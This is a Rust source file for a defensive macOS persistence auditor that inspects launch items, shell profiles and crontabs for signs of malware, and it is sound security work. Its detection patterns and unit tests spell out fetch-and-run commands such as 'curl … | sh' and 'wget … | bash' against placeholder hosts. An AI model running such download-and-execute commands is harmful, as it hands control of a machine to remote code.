//! macOS persistence & trust auditor.
//!
//! Most macOS malware has to survive a reboot, and there are only a handful of
//! places it can do that: LaunchAgents/Daemons, cron, and shell startup files.
//! This walks those locations, resolves what each one runs, and flags the ones
//! that look wrong — an unsigned binary set to run at login, something launching
//! out of `/tmp` or a hidden directory, or a shell profile that pipes a
//! download into a shell. It only reads; it changes nothing.
//!
//! Inspired by Objective-See's KnockKnock, but it explains *why* each item is
//! flagged and ties into the same trust model as `scan`.

use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Level {
    Ok,
    Notable,
    Suspicious,
}

pub struct Item {
    pub level: Level,
    pub label: String,
    pub kind: String,
    pub source: PathBuf,
    pub detail: String,
    pub reasons: Vec<String>,
}

/// Runs the audit and returns the findings, worst first.
pub fn audit() -> Vec<Item> {
    let mut items = Vec::new();
    let home = std::env::var("HOME").unwrap_or_default();

    for dir in [
        format!("{home}/Library/LaunchAgents"),
        "/Library/LaunchAgents".to_string(),
        "/Library/LaunchDaemons".to_string(),
    ] {
        audit_launch_dir(Path::new(&dir), &mut items);
    }

    for rc in [
        ".zshrc",
        ".zprofile",
        ".bash_profile",
        ".bashrc",
        ".profile",
    ] {
        audit_shell_profile(&Path::new(&home).join(rc), &mut items);
    }

    audit_crontab(&mut items);

    items.sort_by(|a, b| b.level.cmp(&a.level).then(a.label.cmp(&b.label)));
    items
}

/// A path that malware favors and legitimate launch items avoid.
fn suspicious_location(p: &Path) -> bool {
    let s = p.to_string_lossy();
    s.starts_with("/tmp/")
        || s.starts_with("/private/tmp/")
        || s.starts_with("/Users/Shared/")
        || s.starts_with("/var/tmp/")
        // a hidden component anywhere (…/.foo/…)
        || p.components().any(|c| {
            c.as_os_str().to_string_lossy().starts_with('.')
                && c.as_os_str().to_string_lossy().len() > 1
        })
}

/// Patterns in a launch argument or shell line that are genuinely dropper-like.
/// Kept narrow on purpose: legitimate shell profiles are full of `eval`,
/// `osascript` and inline interpreters, so flagging those is pure noise. The
/// smoking gun is fetching remote content and running it.
fn suspicious_command(s: &str) -> Option<&'static str> {
    let l = s.to_ascii_lowercase();
    let pipes_to_shell = l.contains("| sh")
        || l.contains("|sh")
        || l.contains("| bash")
        || l.contains("|bash")
        || l.contains("| zsh");
    if (l.contains("curl ") || l.contains("wget ")) && pipes_to_shell {
        Some("downloads and pipes to a shell")
    } else if l.contains("base64") && (l.contains("-d") || l.contains("--decode")) && pipes_to_shell
    {
        Some("decodes base64 and runs it")
    } else {
        None
    }
}

fn audit_launch_dir(dir: &Path, items: &mut Vec<Item>) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().is_none_or(|e| e != "plist") {
            continue;
        }
        let Ok(value) = plist::Value::from_file(&path) else {
            continue;
        };
        let Some(dict) = value.as_dictionary() else {
            continue;
        };

        let label = dict
            .get("Label")
            .and_then(|v| v.as_string())
            .unwrap_or_else(|| path.file_stem().and_then(|s| s.to_str()).unwrap_or("?"))
            .to_string();

        // Resolve what it runs: Program, or the first ProgramArguments entry.
        let args: Vec<String> = dict
            .get("ProgramArguments")
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_string().map(String::from))
                    .collect()
            })
            .unwrap_or_default();
        let program = dict
            .get("Program")
            .and_then(|v| v.as_string())
            .map(String::from)
            .or_else(|| args.first().cloned());
        let run_at_load = dict
            .get("RunAtLoad")
            .and_then(|v| v.as_boolean())
            .unwrap_or(false);

        let mut reasons = Vec::new();
        let mut level = Level::Ok;
        let mut detail = program.clone().unwrap_or_else(|| "(no program)".into());

        let _ = run_at_load; // normal for most launch items; not a signal itself
        if let Some(prog) = &program {
            let prog_path = Path::new(prog);
            // Strong signal: running out of a temp/hidden/shared location.
            if suspicious_location(prog_path) {
                reasons.push("runs from a hidden/temp/shared location".into());
                level = level.max(Level::Suspicious);
            }
            match signing_authority(prog_path) {
                Signing::Missing => {
                    // Often a bundle path we can't resolve, not a real problem.
                    reasons.push("program path not found (may be inside a bundle)".into());
                    level = level.max(Level::Notable);
                }
                Signing::Unsigned => {
                    reasons.push("unsigned / ad-hoc binary".into());
                    level = level.max(Level::Notable);
                    detail = format!("{detail}  (unsigned)");
                }
                Signing::Signed(auth) => {
                    detail = format!("{detail}  (signed: {auth})");
                }
            }
        }
        // The genuinely alarming case: a launch item fetching and running code.
        for a in &args {
            if let Some(why) = suspicious_command(a) {
                reasons.push(why.into());
                level = Level::Suspicious;
            }
        }

        let kind = if dir.to_string_lossy().contains("Daemon") {
            "LaunchDaemon"
        } else {
            "LaunchAgent"
        };
        items.push(Item {
            level,
            label,
            kind: kind.into(),
            source: path,
            detail,
            reasons,
        });
    }
}

fn audit_shell_profile(path: &Path, items: &mut Vec<Item>) {
    let Ok(text) = std::fs::read_to_string(path) else {
        return;
    };
    for (n, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if let Some(why) = suspicious_command(line) {
            items.push(Item {
                level: Level::Suspicious,
                label: format!(
                    "{}:{}",
                    path.file_name().unwrap_or_default().to_string_lossy(),
                    n + 1
                ),
                kind: "shell profile".into(),
                source: path.to_path_buf(),
                detail: truncate(line, 100),
                reasons: vec![why.into()],
            });
        }
    }
}

fn audit_crontab(items: &mut Vec<Item>) {
    let out = std::process::Command::new("crontab").arg("-l").output();
    let Ok(out) = out else { return };
    let text = String::from_utf8_lossy(&out.stdout);
    for (n, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if let Some(why) = suspicious_command(line) {
            items.push(Item {
                level: Level::Suspicious,
                label: format!("crontab:{}", n + 1),
                kind: "cron".into(),
                source: PathBuf::from("crontab -l"),
                detail: truncate(line, 100),
                reasons: vec![why.into()],
            });
        }
    }
}

enum Signing {
    Signed(String),
    Unsigned,
    Missing,
}

/// Cheap signing check for a launch-item target: its first codesign authority,
/// or Unsigned / Missing.
fn signing_authority(path: &Path) -> Signing {
    if !path.exists() {
        return Signing::Missing;
    }
    let out = std::process::Command::new("codesign")
        .args(["-dv", "--verbose=2"])
        .arg(path)
        .output();
    let Ok(out) = out else {
        return Signing::Unsigned;
    };
    let text = String::from_utf8_lossy(&out.stderr);
    for line in text.lines() {
        if let Some(rest) = line.strip_prefix("Authority=") {
            return Signing::Signed(rest.to_string());
        }
    }
    Signing::Unsigned
}

fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else {
        s.chars().take(max).collect::<String>() + "…"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_curl_pipe_shell_not_benign_eval() {
        assert!(suspicious_command("curl -fsSL http://x/y.sh | sh").is_some());
        assert!(suspicious_command("wget -qO- http://x | bash").is_some());
        // Ordinary shell-profile lines must not trip it.
        assert!(suspicious_command("eval \"$(/opt/homebrew/bin/brew shellenv)\"").is_none());
        assert!(suspicious_command("eval \"$__conda_setup\"").is_none());
        assert!(suspicious_command("osascript -e 'display notification'").is_none());
    }

    #[test]
    fn flags_temp_and_hidden_locations() {
        assert!(suspicious_location(Path::new("/tmp/x")));
        assert!(suspicious_location(Path::new("/Users/Shared/.hidden/u")));
        assert!(suspicious_location(Path::new("/Users/me/.cache/evil")));
        assert!(!suspicious_location(Path::new(
            "/Applications/Safari.app/Contents/MacOS/Safari"
        )));
        assert!(!suspicious_location(Path::new(
            "/opt/homebrew/bin/postgres"
        )));
    }
}
